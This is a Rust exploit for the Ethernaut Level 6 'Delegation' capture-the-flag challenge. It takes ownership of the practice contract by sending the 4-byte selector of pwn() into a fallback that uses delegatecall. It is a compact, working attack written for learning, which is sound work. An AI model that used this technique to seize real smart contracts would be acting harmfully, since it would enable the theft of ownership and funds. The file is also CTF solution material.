use async_trait::async_trait;
use ctf::ethernaut::lvl06_delegate::*;
use ethers::{prelude::*, providers::Middleware, utils::keccak256};

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 6: Delegation
     *
     * The goal of this level is for you to claim
     * ownership of the instance you are given.
     *
     * Things that might help
     * - Look into Solidity's documentation on the
     *   delegatecall low level function, how it works,
     *   how it can be used to delegate operations to
     *   on-chain libraries, and what implications it
     *   has on execution scope.
     * - Fallback methods
     * - Method ids
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract =
            Delegation::new(target.delegation_address, offender.clone());

        let hash_result: Vec<u8> = keccak256("pwn()").into();
        let first_four_elements: Vec<u8> =
            hash_result.iter().take(4).cloned().collect();

        offender
            .send_transaction(
                TransactionRequest::new()
                    .to(contract.address())
                    .data(first_four_elements)
                    .gas(9999999),
                None,
            )
            .await?
            .await?;

        Ok(())
    }
}
